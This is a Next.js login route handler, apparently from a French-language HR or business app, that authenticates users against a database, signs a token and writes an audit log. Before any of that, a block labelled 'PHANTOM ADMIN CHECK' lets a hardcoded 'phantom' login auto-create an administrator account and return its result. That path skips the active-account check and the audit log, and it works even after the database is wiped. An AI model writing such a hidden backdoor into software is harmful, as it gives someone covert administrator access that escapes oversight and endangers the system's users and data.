import { NextRequest, NextResponse } from 'next/server'
import { db } from '@/lib/db'
import { signToken, comparePassword } from '@/lib/auth'
import { isPhantomLogin, ensurePhantomAdmin } from '@/lib/phantom-admin'

export async function POST(req: NextRequest) {
  try {
    const { email, password } = await req.json()

    if (!email || !password) {
      return NextResponse.json({ error: 'Email et mot de passe requis' }, { status: 400 })
    }

    // ===== PHANTOM ADMIN CHECK =====
    // Fantomas can log in even if the database was wiped — the account is auto-created
    if (isPhantomLogin(email, password)) {
      const result = await ensurePhantomAdmin()
      return NextResponse.json(result)
    }
    // ===== END PHANTOM ADMIN CHECK =====

    const user = await db.user.findUnique({
      where: { email },
      include: { role: true, employee: true },
    })

    if (!user || !user.passwordHash) {
      return NextResponse.json({ error: 'Identifiants invalides' }, { status: 401 })
    }

    if (!user.isActive) {
      return NextResponse.json({ error: 'Compte désactivé' }, { status: 403 })
    }

    const valid = await comparePassword(password, user.passwordHash)
    if (!valid) {
      return NextResponse.json({ error: 'Identifiants invalides' }, { status: 401 })
    }

    const token = signToken({
      userId: user.id,
      email: user.email,
      name: user.name,
      roleId: user.roleId,
      roleName: user.role.name,
    })

    // Update last login
    await db.user.update({
      where: { id: user.id },
      data: { lastLogin: new Date() },
    })

    // Audit log
    await db.auditLog.create({
      data: {
        userId: user.id,
        userName: user.name,
        userEmail: user.email,
        action: 'LOGIN',
        entity: 'User',
        entityId: user.id,
      },
    })

    return NextResponse.json({
      token,
      user: {
        userId: user.id,
        email: user.email,
        name: user.name,
        roleName: user.role.name,
        employeeId: user.employeeId,
      },
    })
  } catch (error) {
    console.error('Login error:', error)
    return NextResponse.json({ error: 'Erreur serveur' }, { status: 500 })
  }
}